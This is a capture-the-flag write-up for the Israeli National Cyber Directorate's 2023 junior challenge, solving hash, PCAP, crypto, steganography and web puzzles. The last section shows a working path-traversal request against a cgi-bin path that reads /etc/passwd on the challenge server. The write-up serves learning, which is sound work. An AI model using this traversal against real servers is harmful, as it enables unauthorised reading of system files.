# INCD - Junior Cyber Challenge 2023

This is a short CTF by the Israeli National Cyber Directorate, as part of a recruitment campaign. 

## Junior researcher challenge

### login page

> Download the html file and find the flag

```html
<script>
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*  SHA-1 implementation in JavaScript | (c) Chris Veness 2002-2010 | www.movable-type.co.uk      */
/*   - see http://csrc.nist.gov/groups/ST/toolkit/secure_hashing.html                             */
/*         http://csrc.nist.gov/groups/ST/toolkit/examples.html                                   */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */

// The webpage provided by INCD included a Javascript SHA1 implementation here, 
// removed for clarity.

/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
</script>

<html>
    <head>
        <title>אתגר מערך הסייבר הלאומי</title>
    </head>
    <body>
        <input type="text" name="flag" id="flag" value="Enter the flag" />
        <input type="button" id="prompt" value="Click to check the flag" />
        <script type="text/javascript">
            document.getElementById("prompt").onclick = function () {
                var flag = document.getElementById("flag").value;
                if (Sha1.hash(flag) == "9408b6fc3524ec82d20ed65bb0a93178cb5565dd") {
                    alert("Correct flag!, enter the flag to procceed");
                } else {
                    alert("Ops, Incorrect flag :(");
                }
            }
        </script>
    </body>
</html>
```

Use a [reverse hash service](https://md5hashing.net/hash/sha1/9408b6fc3524ec82d20ed65bb0a93178cb5565dd) to find the SHA1 input that produces `9408b6fc3524ec82d20ed65bb0a93178cb5565dd`.  
The flag is `hash_me`.

### pcap investigation

> Investigate the PCAP file in order to find the flag.
> 
> 1. The flag consists of two parts
> 2. flag structure - XXXX_XX_XXX

There's not much content in the attached PCAP according to the protocol breakdown:

```console
┌──(user@kali)-[/media/sf_CTFs/INCD/pcap_investigation]
└─$ tshark -qz io,phs -r pcap_challenge.pcap

===================================================================
Protocol Hierarchy Statistics
Filter:

null                                     frames:1563 bytes:346009
  ip                                     frames:1563 bytes:346009
    udp                                  frames:20 bytes:3764
      ssdp                               frames:20 bytes:3764
    icmp                                 frames:6 bytes:768
      nbns                               frames:6 bytes:768
    tcp                                  frames:1537 bytes:341477
      tls                                frames:714 bytes:299988
      http                               frames:6 bytes:5011
        data-text-lines                  frames:2 bytes:1290
        json                             frames:1 bytes:1005
      data                               frames:1 bytes:45
===================================================================
```

View the message in TCP stream 14:

```console
┌──(user@kali)-[/media/sf_CTFs/INCD/pcap_investigation]
└─$ tshark -r pcap_challenge.pcap -qz follow,tcp,ascii,14

===================================================================
Follow: tcp,ascii
Filter: tcp.stream eq 14
Node 0: 127.0.0.1:55776
Node 1: 127.0.0.1:8000
787
GET / HTTP/1.1
Host: 127.0.0.1
sec-ch-ua: "Chromium";v="111", "Not(A:Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Date:MNDU42DDIY4XIWSWHA4GI3KWPFSVGQTOMIZDS22MINBDKYRTKVTWE3KWNRNEGQRQMJ4UE3LBK42WWSKHIVTWE3SWORMW2VTZJFEFE5SJI5HHMYSYIJZVUWCSNRE
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
info: 00110000 00110000 00110111
Connection: close


        601
HTTP/1.1 303 See Other
Date: Sun, 12 Mar 2023 16:45:16 GMT
Content-Type: text/html; charset=UTF-8
X-Content-Type-Options: nosniff
Content-Length: 321
Location: http://127.0.0.1/en-US/
Vary: Accept-Language
Connection: Close
X-Frame-Options: SAMEORIGIN
Server: Splunkd

<!doctype html><html><head><meta http-equiv="content-type" content="text/html; charset=UTF-8"><meta http-equiv="refresh" content="1;url=http://127.0.0.1/en-US/"><title>303 See Other</title></head><body><h1>See Other</h1><p>The resource has moved temporarily <a href="http://127.0.0.1/en-US/">here</a>.</p></body></html>

===================================================================
```

The value for the "Date" header seems weird. Decode as Base32 to `cGNhcF9tZV88dmVyeSBnb29kLCB5b3UgbmVlZCB0byBmaW5kIGEgbnVtYmVyIHRvIGNvbXBsZXRlJ`, then as base64 to `pcap_me_<very good, you need to find a number to complete`. To complete the flag, decode the "info" header as binary: `007`. The flag is `pcap_me_007`.

### save the file

> Save the .enc file

We get two files: `file.enc` and `p.pem`. Decrypt with OpenSSL:

```console
┌──(user@kali)-[/media/sf_CTFs/INCD/save_the_file]
└─$ openssl rsautl -decrypt -inkey p.pem -in file.enc
you_got_the_rsa_flag
```

### Under Maintenance

> The flag format - Flag{This_is_Example}

A website was attached. Visit it:

```console
┌──(user@kali)-[/media/sf_CTFs/INCD/Under_Maintenance]
└─$ curl https://incd-challange-undermaintenance.chals.io/
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Bootstrap Website Example</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <style>
  .fakeimg {
    height: 200px;
    background: #aaa;
  }
  </style>
</head>
<body>

<div class="jumbotron text-center" style="margin-bottom:0">
  <h1>Under Maintenance</h1>
  <p>There is nothing to see here</p>
</div>

</body>
</html>
```

Check `robots.txt`:

```console
┌──(user@kali)-[/media/sf_CTFs/INCD/Under_Maintenance]
└─$ curl https://incd-challange-undermaintenance.chals.io/robots.txt
User-agent: *
Disallow: /kifjf/
```

Visit `/kifjf` (note that `/kifjf/` returns an error):

```console
┌──(user@kali)-[/media/sf_CTFs/INCD/Under_Maintenance]
└─$ curl https://incd-challange-undermaintenance.chals.io//kifjf
Flag{Rob0t_F1@g}
```

The flag that was accepted was `Rob0t_F1@g`.

### Connecting people

> The SOC handed over to you a PCAP file find the password the attacker used to connect to the server

A PCAP was attached. Search it for "password":

```console
┌──(user@kali)-[/media/sf_CTFs/INCD/Connecting_people]
└─$ tshark -nr challengePCAP.pcapng  -Y 'frame contains "password"'
91272 149.162397  13.107.4.50 → 192.168.188.135 TCP 1514 80 → 50124 [ACK] Seq=2153284 Ack=7000 Win=64240 Len=1460 [TCP segment of a reassembled PDU]
91449 149.164680  13.107.4.50 → 192.168.188.135 HTTP 1341 HTTP/1.1 200 OK  (application/x-chrome-extension)
160134 367.882945 192.168.188.134 → 192.168.188.135 HTTP 1304 HTTP/1.1 200 OK  (text/html)
166803 499.208124 192.168.188.135 → 192.168.188.134 HTTP 684 POST / HTTP/1.1  (application/x-www-form-urlencoded)
```

The last frame is a POST, let's see the content:

```console
┌──(user@kali)-[/media/sf_CTFs/INCD/Connecting_people]
└─$ tshark -nr challengePCAP.pcapng  -Y 'frame.number == 166803' -T fields -e text
Timestamps,POST / HTTP/1.1\r\n,\r\n,Form item: "username" = "Pitbull",Form item: "password" = "incorrect!"
```

The password is `incorrect!`, however that flag that was accepted was `incorrect`.


### Find Me 

> Find the hidden flag

An HTML file was attached.

```html
<!DOCTYPE html>
<html>
<head>
	<title>Login</title>
</head>
<body>
	<h1>Login</h1>
	<form onsubmit="event.preventDefault(); validate()" method="POST">
		<label for="username">Username:</label>
		<input type="text" id="username" name="username"><br><br>
		<label for="password">Password:</label>
		<input type="password" id="password" name="password"><br><br>
		<button type="submit">Submit</button>
	</form>
	<div id="image" style="display: none;">
		<img src="data:image/png;base64,......................."/> <!-- The original challenge contained a long Base64 string here -->
	</div>
	<script>
		const username = atob("SU5DRA=="); 
		const password = atob("SU5DRA=="); 

		function validate() {
			const enteredUsername = document.getElementById("username").value;
			const enteredPassword = document.getElementById("password").value;

			if (enteredUsername === username && enteredPassword === password) {
				document.getElementById("image").style.display = "block";
			} else {
				alert("Invalid input");
			}
		}
	</script>
</body>
</html>
```

Decode `SU5DRA==` as base64 to `INCD` and enter as username and password to see the image. Alternatively, reveal the image by removing the `style="display: none;"`.
The flag is in the image: `INCD_RULES`.

### only jpg?

> Find the hidden flag

A JPEG file was attached. Use `steghide` without a password to extract the flag:

```console
┌──(user@kali)-[/media/sf_CTFs/INCD/only_jpg]
└─$ steghide extract -sf flag.jpg
Enter passphrase:
wrote extracted data to "flag.txt".

┌──(user@kali)-[/media/sf_CTFs/INCD/only_jpg]
└─$ cat flag.txt
stego_flag_2023
```

### use the map

A screenshot of some area in Seattle was attached. One of the street names was changed to `very_simple_flag`.

### can you see?

> The flag format - Flag{This_is_Example}

A website was attached, together with the following source code:

```php
<?php
header('Pragma: cache');
header("Cache-Control: max-age=500"); 
header("X-XSS-Protection: 0");
?>
<html>
<head>
<meta charset=utf-8>
<head>
<body>

<?php
$head = array("Pragma: cache", "Cache-Control: max-age=500", "X-XSS-Protection: 0");
$input = [];
$i=0;
$flag="false";
if(isset($_SERVER['HTTP_REFERER'])) 
{
echo "Bad Referrer!";
}
else
{
foreach (getallheaders() as $name => $value) {
    echo "$name: $value\n"; array_push($input,"$name: $value");
    
    }
    
}

if (count(array_intersect($head, $input)) == count($head)) {
  writeMsg();
} 
else {
  echo "Try Harder!";
}
?>
</body>
</html>
```

To get the flag, send the following request:

```console
┌──(user@kali)-[/media/sf_CTFs/INCD/can_you_see]
└─$ curl https://incd-challange-can_you_see.chals.io/index.php -H "Pragma: cache" -H "Cache-Control: max-age=500" -H "X-XSS-Protection: 0"
<html>
<head>
<meta charset=utf-8>
<head>
<body>

Host: incd-challange-can_you_see.chals.io
User-Agent: curl/7.74.0
Accept: */*
Pragma: cache
Cache-Control: max-age=500
X-XSS-Protection: 0
Flag{missing_hEader_Fl@g}
</body>
</html>
```

### Decrypt Me 

> You have been given some part of message that has been manipulated in some way along with XOR 1 character key.
> 
> Your task is to write a script to decode and decrypt the message and reveal the original message.
> 
> The encrypted message is: =AEShtGbDBnacFHZgdnQ
> 
> Your script should print out the original message. the final flag is "Original Message -Xor key" for example if the decrypted original message is "YesWeCan" and it was encrypted using XOR key 9, insert the final flag in the following format : {YesWeCan-9}
> 
> Good luck!
> 
> Please attach the code to the mail

That looks like base64 reversed, reverse and decode as base64, then try all 256 value to decrypt. The key that works is `0x05`, giving `GreatYouFindME`. The flag is `{GreatYouFindME-5}`.

### Lets go

> The flag format - Flag{This_is_Example}

A website was attached. Let's check it:

```console
┌──(user@kali)-[/media/sf_CTFs/INCD/Lets_go]
└─$ curl https://incd-challange-lets_go.chals.io
<html><body><h1>It works!</h1></body></html>
```

We run `dirsearch` on it:

```console
┌──(user@kali)-[/media/sf_CTFs/INCD/can_you_see]
└─$ dirsearch -u https://incd-challange-lets_go.chals.io/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /media/sf_CTFs/INCD/can_you_see/reports/https_incd-challange-lets_go.chals.io/__23-04-17_20-04-55.txt

Target: https://incd-challange-lets_go.chals.io/

[20:04:55] Starting:
[20:05:30] 200 -    1KB - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[20:05:30] 200 -  820B  - /cgi-bin/printenv
[20:05:30] 200 -    1KB - /cgi-bin/test-cgi

Task Completed
```

Let's follow up on the first result:

```console
┌──(user@kali)-[/media/sf_CTFs/INCD/can_you_see]
└─$ curl --path-as-is https://incd-challange-lets_go.chals.io/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin
utmp:x:100:406:utmp:/home/utmp:/bin/false
Flag{U_F1nd_/\/\!}
```

The flag is `Flag{U_F1nd_/\/\!}`.